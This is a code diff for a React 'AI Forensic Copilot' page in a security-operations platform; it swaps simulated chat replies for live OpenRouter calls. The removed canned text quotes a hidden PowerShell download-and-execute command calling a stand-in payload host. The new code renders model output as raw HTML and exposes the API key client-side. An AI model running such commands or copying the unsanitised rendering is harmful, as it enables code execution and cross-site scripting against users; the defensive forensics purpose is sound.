@@ -1,60 +1,170 @@
-import React, { useState } from 'react';
+import React, { useState, useRef, useEffect } from 'react';
 import { useForensic } from '../context/ForensicContext';
-import { Cpu, Send, ShieldCheck, Terminal, HelpCircle, Loader2 } from 'lucide-react';
+import { Cpu, Send, ShieldCheck, Terminal, HelpCircle, Loader2, AlertTriangle, Zap, Brain } from 'lucide-react';
+
+const OPENROUTER_API_KEY = import.meta.env.VITE_OPENROUTER_API_KEY;
+
+// Build a forensic context summary from real application data
+function buildForensicContext(detections, events, evidence, iocs) {
+  const parts = [];
+
+  if (detections?.length > 0) {
+    parts.push('=== ACTIVE THREAT DETECTIONS ===');
+    detections.slice(0, 20).forEach(d => {
+      parts.push(`[${d.severity}] ${d.threatType} — ${d.description} | MITRE: ${d.mitreTechnique}`);
+    });
+  }
+
+  if (events?.length > 0) {
+    parts.push('\n=== RECENT FORENSIC EVENTS (last 25) ===');
+    events.slice(-25).forEach(e => {
+      parts.push(`[${e.severity}] ${e.action} | Source: ${e.source} | IP: ${e.ipAddress} | User: ${e.username} | ${e.payloadDetails?.substring(0, 120) || ''}`);
+    });
+  }
+
+  if (evidence?.length > 0) {
+    parts.push('\n=== EVIDENCE FILES ===');
+    evidence.forEach(e => {
+      parts.push(`${e.fileName} (${e.fileType}) — Status: ${e.status} — Hash: ${e.hash?.substring(0, 16)}...`);
+    });
+  }
+
+  if (iocs?.length > 0) {
+    parts.push('\n=== INDICATORS OF COMPROMISE ===');
+    iocs.forEach(i => {
+      parts.push(`[${i.type}] ${i.value || i.iocValue} — ${i.description}`);
+    });
+  }
+
+  return parts.join('\n');
+}
+
+async function callOpenRouterAI(messages, forensicContext) {
+  if (!OPENROUTER_API_KEY) {
+    return '⚠️ AI API key not configured. Set VITE_OPENROUTER_API_KEY in your .env file.';
+  }
+
+  const systemPrompt = `You are LogForX AI Forensic Copilot — a senior digital forensics & incident response (DFIR) analyst AI embedded in a Security Operations Center platform.
+
+You have direct access to the live forensic data from the current investigation. Here is the real-time telemetry:
+
+${forensicContext}
+
+INSTRUCTIONS:
+- Analyze the above real forensic data when answering questions.
+- Reference specific IPs, usernames, event IDs, MITRE techniques, and IOCs from the data.
+- Provide actionable, technical DFIR responses — not generic advice.
+- Map findings to MITRE ATT&CK framework where applicable.
+- When asked for recommendations, give specific containment, eradication, and recovery steps.
+- Use a professional SOC analyst tone. Be concise but thorough.
+- Format responses with clear structure using bullet points where helpful.
+- If asked about attacks not present in the data, say so honestly.`;
+
+  const apiMessages = [
+    { role: 'system', content: systemPrompt },
+    ...messages.map(m => ({
+      role: m.sender === 'user' ? 'user' : 'assistant',
+      content: m.text
+    }))
+  ];
+
+  const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
+    method: 'POST',
+    headers: {
+      'Authorization': `Bearer ${OPENROUTER_API_KEY}`,
+      'Content-Type': 'application/json',
+      'HTTP-Referer': window.location.origin,
+      'X-Title': 'LogForX Digital Forensics Platform'
+    },
+    body: JSON.stringify({
+      model: 'mistralai/mistral-small-2603',
+      messages: apiMessages,
+      max_tokens: 1024,
+      temperature: 0.3
+    })
+  });
+
+  if (!response.ok) {
+    const err = await response.text();
+    console.error('[AI] OpenRouter error:', response.status, err);
+    return `⚠️ AI service error (${response.status}). ${err?.substring(0, 200) || 'Check your API key and try again.'}`;
+  }
+
+  const data = await response.json();
+  return data.choices?.[0]?.message?.content || 'No response generated. Please try again.';
+}
 
 export default function AIInvestigation() {
-  const { aiData, detections } = useForensic();
+  const { aiData, detections, events, evidence, iocs } = useForensic();
   const [messages, setMessages] = useState([
-    { sender: 'ai', text: 'Hello Investigator. I have synchronized with the security databases and analyzed your evidence segments. What details would you like to investigate regarding this intrusion path?' }
+    { sender: 'ai', text: '🔒 **LogForX AI Forensic Copilot Online.**\n\nI have synchronized with your live forensic databases — evidence files, threat detections, timeline events, and IOCs are loaded into my analysis context.\n\nAsk me anything about the active intrusion, attack patterns, compromised assets, or remediation strategies.' }
   ]);
   const [inputValue, setInputValue] = useState('');
   const [chatLoading, setChatLoading] = useState(false);
+  const chatEndRef = useRef(null);
 
-  const handleSendMessage = (e) => {
+  useEffect(() => {
+    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
+  }, [messages, chatLoading]);
+
+  const handleSendMessage = async (e) => {
     e.preventDefault();
-    if (!inputValue.trim()) return;
+    if (!inputValue.trim() || chatLoading) return;
 
     const userMessage = { sender: 'user', text: inputValue };
-    setMessages(prev => [...prev, userMessage]);
+    const updatedMessages = [...messages, userMessage];
+    setMessages(updatedMessages);
     setInputValue('');
     setChatLoading(true);
 
-    // Simulate smart AI response delay
-    setTimeout(() => {
-      let aiResponseText = "I have analyzed your request. Based on the ingested forensic logs, the attack path indicates credential compromise via remote login attempts, followed by script downloads and TCP socket connections to indicators.";
-      
-      const query = inputValue.toLowerCase();
-      
-      if (query.includes('credential') || query.includes('user') || query.includes('login') || query.includes('brute')) {
-        aiResponseText = "Logs show that the attacker initiated a brute-force dictionary attack on the 'administrator' account. After multiple failed attempts (EventID 4625), they authenticated successfully (EventID 4624) from source IP 192.168.1.142 (Windows) / 203.0.113.88 (Linux).";
-      } else if (query.includes('malware') || query.includes('powershell') || query.includes('execute') || query.includes('script')) {
-        aiResponseText = "Sysmon logs captured a process creation command (EventID 1): powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://cyber-threat-ioc.com/payload.ps1')\". This downloaded and executed a primary payload file in C:\\ProgramData\\.";
-      } else if (query.includes('c2') || query.includes('ip') || query.includes('connection') || query.includes('network') || query.includes('port')) {
-        aiResponseText = "Outbound network connection (EventID 3) established traffic streams to command-and-control server 185.220.101.4 on port 4444 (HTTPS). Standard iptables logs also caught port scanning targeting internal assets.";
-      } else if (query.includes('mitigate') || query.includes('recommend') || query.includes('block') || query.includes('remedi')) {
-        aiResponseText = "Remediation protocols dictate: 1) Isolate host 192.168.1.142 immediately. 2) Block outbound connections to C2 IP 185.220.101.4 and domain backdoor-c2.net. 3) Revoke and cycle all credentials for the administrator/root account. 4) Deploy MFA policies.";
-      } else if (query.includes('exfiltrat') || query.includes('data') || query.includes('excel') || query.includes('zip')) {
-        aiResponseText = "Exfiltration events show the attacker copied C:\\Database\\sensitive_credentials.xlsx to an archive named temp.zip in ProgramData, and uploaded it to 185.220.101.4 via SFTP protocols.";
-      }
-
-      setMessages(prev => [...prev, { sender: 'ai', text: aiResponseText }]);
+    try {
+      const forensicContext = buildForensicContext(detections, events, evidence, iocs);
+      const aiResponse = await callOpenRouterAI(updatedMessages, forensicContext);
+      setMessages(prev => [...prev, { sender: 'ai', text: aiResponse }]);
+    } catch (error) {
+      console.error('[AI] Request failed:', error);
+      setMessages(prev => [...prev, { sender: 'ai', text: `⚠️ Connection error: ${error.message}. Ensure your network can reach OpenRouter.` }]);
+    } finally {
       setChatLoading(false);
-    }, 1200);
+    }
   };
 
   const samplePrompts = [
-    "What compromised user credentials did the attacker use?",
-    "Explain the malicious PowerShell command executed.",
-    "What network C2 server and port connections were made?",
-    "Show me the exfiltration details and target files.",
-    "What are the immediate recommendations to block this attack?"
+    "Analyze the current threats and rank by severity",
+    "What user accounts were compromised in this attack?",
+    "Map the full kill chain from initial access to exfiltration",
+    "What IOCs should I block immediately?",
+    "Give me a step-by-step incident response plan",
+    "Explain the MITRE ATT&CK techniques used in this intrusion"
   ];
+
+  const apiStatus = OPENROUTER_API_KEY ? 'LIVE' : 'NOT CONFIGURED';
+  const statusColor = OPENROUTER_API_KEY ? 'text-emerald-400' : 'text-red-400';
+  const statusDot = OPENROUTER_API_KEY ? 'bg-emerald-500' : 'bg-red-500';
+
+  // Simple markdown-ish rendering for AI responses
+  const renderMessageText = (text) => {
+    if (!text) return null;
+    return text.split('\n').map((line, i) => {
+      // Bold
+      let rendered = line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-cyan-300">$1</strong>');
+      // Bullet points
+      if (rendered.trim().startsWith('- ') || rendered.trim().startsWith('• ')) {
+        return <div key={i} className="pl-3 py-0.5" dangerouslySetInnerHTML={{ __html: '• ' + rendered.replace(/^[-•]\s*/, '') }} />;
+      }
+      if (rendered.trim() === '') return <br key={i} />;
+      return <div key={i} className="py-0.5" dangerouslySetInnerHTML={{ __html: rendered }} />;
+    });
+  };
 
   return (
     <div className="space-y-6">
       <div>
-        <h1 className="text-2xl font-bold tracking-wider text-white uppercase font-mono">AI Forensic Copilot</h1>
-        <p className="text-sm text-slate-400">Context-aware machine learning agent compiling timelines, mapping root causes, and providing remediation actions.</p>
+        <h1 className="text-2xl font-bold tracking-wider text-white uppercase font-mono flex items-center gap-3">
+          <Brain className="w-7 h-7 text-cyan-400" />
+          AI Forensic Copilot
+        </h1>
+        <p className="text-sm text-slate-400 mt-1">Real-time AI-powered forensic analysis connected to your live evidence, threat detections, and IOCs.</p>
       </div>
 
       <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 items-stretch">
@@ -70,7 +180,7 @@ export default function AIInvestigation() {
 
               <div>
                 <span className="text-[10px] text-cyan-500 font-mono block uppercase">Incident Summary</span>
-                <p className="text-xs text-slate-300 leading-relaxed mt-1">{aiData.incidentSummary || "No active log analysis parsed."}</p>
+                <p className="text-xs text-slate-300 leading-relaxed mt-1">{aiData.incidentSummary || "Upload evidence files to generate an AI-powered incident summary."}</p>
               </div>
 
               <div>
@@ -86,12 +196,36 @@ export default function AIInvestigation() {
                   ))}
                 </ul>
               </div>
+
+              {/* Live Data Stats */}
+              <div className="border-t border-slate-900 pt-3 space-y-2">
+                <span className="text-[10px] text-cyan-500 font-mono block uppercase">AI Context Data</span>
+                <div className="grid grid-cols-2 gap-2">
+                  <div className="bg-slate-900/50 rounded-lg p-2 text-center border border-slate-800/50">
+                    <div className="text-lg font-bold text-cyan-400 font-mono">{detections?.length || 0}</div>
+                    <div className="text-[9px] text-slate-500 uppercase font-mono">Threats</div>
+                  </div>
+                  <div className="bg-slate-900/50 rounded-lg p-2 text-center border border-slate-800/50">
+                    <div className="text-lg font-bold text-purple-400 font-mono">{events?.length || 0}</div>
+                    <div className="text-[9px] text-slate-500 uppercase font-mono">Events</div>
+                  </div>
+                  <div className="bg-slate-900/50 rounded-lg p-2 text-center border border-slate-800/50">
+                    <div className="text-lg font-bold text-amber-400 font-mono">{evidence?.length || 0}</div>
+                    <div className="text-[9px] text-slate-500 uppercase font-mono">Evidence</div>
+                  </div>
+                  <div className="bg-slate-900/50 rounded-lg p-2 text-center border border-slate-800/50">
+                    <div className="text-lg font-bold text-red-400 font-mono">{iocs?.length || 0}</div>
+                    <div className="text-[9px] text-slate-500 uppercase font-mono">IOCs</div>
+                  </div>
+                </div>
+              </div>
             </div>
 
             <div className="pt-4 border-t border-slate-900">
-              <div className="flex items-center gap-1.5 text-[10px] font-mono text-emerald-400">
+              <div className={`flex items-center gap-1.5 text-[10px] font-mono ${statusColor}`}>
+                <span className={`w-2 h-2 rounded-full ${statusDot} ${OPENROUTER_API_KEY ? 'animate-pulse' : ''}`} />
                 <ShieldCheck className="w-4 h-4" />
-                AI AGENT ONLINE (LOGFORX-CORE-v2.1)
+                AI ENGINE {apiStatus} — OPENROUTER
               </div>
             </div>
           </div>
@@ -105,8 +239,13 @@ export default function AIInvestigation() {
             <div className="flex items-center gap-2">
               <Terminal className="w-4 h-4 text-cyan-400" />
               <span className="text-xs font-bold text-white font-mono uppercase tracking-wider">Forensic Copilot Terminal</span>
+              {OPENROUTER_API_KEY && (
+                <span className="text-[9px] font-mono bg-emerald-950/50 text-emerald-400 border border-emerald-500/30 px-1.5 py-0.5 rounded">
+                  <Zap className="w-3 h-3 inline-block mr-0.5" />LIVE AI
+                </span>
+              )}
             </div>
-            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-lg shadow-emerald-950/30 animate-pulse" />
+            <span className={`w-2.5 h-2.5 rounded-full ${statusDot} shadow-lg animate-pulse`} />
           </div>
 
           {/* Chat Messages */}
@@ -127,7 +266,7 @@ export default function AIInvestigation() {
                 <div className={`p-3.5 rounded-lg leading-relaxed ${
                   msg.sender === 'user' ? 'bg-purple-950/30 border border-purple-500/20 text-purple-200' : 'bg-slate-900/60 border border-slate-800 text-slate-300'
                 }`}>
-                  {msg.text}
+                  {msg.sender === 'ai' ? renderMessageText(msg.text) : msg.text}
                 </div>
               </div>
             ))}
@@ -139,10 +278,11 @@ export default function AIInvestigation() {
                 </div>
                 <div className="p-3.5 rounded-lg bg-slate-900/60 border border-slate-800 flex items-center gap-2 text-slate-500">
                   <Loader2 className="w-4 h-4 animate-spin text-cyan-400" />
-                  Analyzing log sequences...
+                  Analyzing forensic data with AI model...
                 </div>
               </div>
             )}
+            <div ref={chatEndRef} />
           </div>
 
           {/* Sample prompts */}
@@ -167,14 +307,14 @@ export default function AIInvestigation() {
               type="text"
               value={inputValue}
               onChange={(e) => setInputValue(e.target.value)}
-              placeholder="Query the AI Copilot on intrusion metrics..."
+              placeholder={OPENROUTER_API_KEY ? "Ask the AI Copilot about your investigation..." : "⚠️ Set VITE_OPENROUTER_API_KEY in .env to enable AI"}
               className="flex-1 glass-input rounded-lg px-4 py-2.5 text-xs font-mono"
               disabled={chatLoading}
             />
             <button
               type="submit"
-              className="px-4 py-2.5 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white font-mono text-xs font-bold tracking-wider transition-colors cursor-pointer shrink-0"
-              disabled={chatLoading}
+              className="px-4 py-2.5 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white font-mono text-xs font-bold tracking-wider transition-colors cursor-pointer shrink-0 disabled:opacity-50"
+              disabled={chatLoading || !OPENROUTER_API_KEY}
             >
               <Send className="w-4 h-4" />
             </button>
